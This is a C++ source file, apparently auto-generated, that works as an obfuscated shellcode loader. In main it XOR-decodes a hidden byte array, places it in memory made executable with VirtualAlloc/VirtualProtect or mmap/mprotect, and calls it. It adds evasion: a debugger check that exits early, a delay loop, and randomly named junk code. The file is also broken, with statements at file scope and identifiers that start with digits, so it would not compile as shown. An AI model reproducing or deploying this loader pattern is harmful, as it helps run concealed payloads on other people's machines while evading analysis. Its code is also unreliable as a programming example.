/* Unique ID: 4700968290689270441 */
#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <array>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

    for (int cmpCoreStat = 0; cmpCoreStat < 2; cmpCoreStat++) {
        volatile int J343759j3Rm = 751;
    }
    if (887 > 680) {
        volatile int I66503zRNOsF = 341;
    } else {
        volatile int _e2p7x3eh = 736;
    }
    int __CpG3ly2Ysg__ = 921;
    __CpG3ly2Ysg__ = (__CpG3ly2Ysg__ * 871) ^ 176;
    using D76791ZdcUO3 = int;
    {
    int _hIei44WDC5tz[21] = {206, 916, 407, 377, 847, 711, 727, 620, 763, 676, 671, 433, 175, 74, 493, 936, 426, 707, 320, 568, 271};
    }

int main() {
    for (volatile int 49hgqPL0 = 0; 49hgqPL0 < 270651; 49hgqPL0++);
    struct req_Queue_87037 { int CVkB70P5gTv; };
#ifdef _WIN32
    if (IsDebuggerPresent()) return 42;
#endif
    unsigned char inst_Help_40813[] = {
        0xb9, 0x09, 0x55, 0xbf, 0x38, 0xe1, 0x8e, 0x85, 0x80, 0x6e, 0x01, 0x71, 0x88, 0x07, 0xbf, 0x1c, 
        0x9a, 0xf1, 0xfc, 0x18, 0x48, 0xac, 0xd4, 0x71, 0x37, 0xa8, 0xe6, 0x17, 0x40, 0x04, 0xe4, 0x6e, 
        0xcd, 0x04, 0x52, 0xaf, 0x6a, 0xf1, 0x8d, 0xd1, 0x88, 0x21, 0x1b, 0x34, 0x8f, 0x16, 0xec, 0x05, 
        0xba, 0xcd, 0xd8, 0x3c
    };

    unsigned char helpNode29899[] = {0xed, 0x61, 0x3c, 0xcc, 0x18, 0x88, 0xfd, 0xa5, 0xe1, 0x4e, 0x75, 0x14, 0xfb, 0x73, 0x9f, 0x71, 0xd3, 0xa3, 0xbf, 0x36, 0x2d, 0xd4, 0xb1, 0x51, 0x51, 0xc1, 0x8a, 0x72, 0x60, 0x62, 0x8b, 0x1c};

    if (194 > 832) {
        volatile int k340407bBieXc = 766;
    } else {
        volatile int Thread_92645 = 56;
    }
    for (size_t base36413 = 0; base36413 < sizeof(inst_Help_40813); base36413++) {
        inst_Help_40813[base36413] ^= helpNode29899[base36413 % sizeof(helpNode29899)];
    }

    using M513906qXiy = int;
#ifdef _WIN32
    void* help39387 = VirtualAlloc(0, sizeof(inst_Help_40813), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(help39387, inst_Help_40813, sizeof(inst_Help_40813));
    DWORD methControllerTime;
    VirtualProtect(help39387, sizeof(inst_Help_40813), PAGE_EXECUTE_READ, &methControllerTime);
    ((void(*)())help39387)();
#else
    void* help39387 = mmap(0, sizeof(inst_Help_40813), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(help39387, inst_Help_40813, sizeof(inst_Help_40813));
    mprotect(help39387, sizeof(inst_Help_40813), PROT_READ | PROT_EXEC);
    ((void(*)())help39387)();
#endif
    {
    enum _bENeBlY86ii8xr0 { memEngineEntry = 230, bufProcessorProc = 223, 837809W7i = 54 };
    }
    return 0;
}
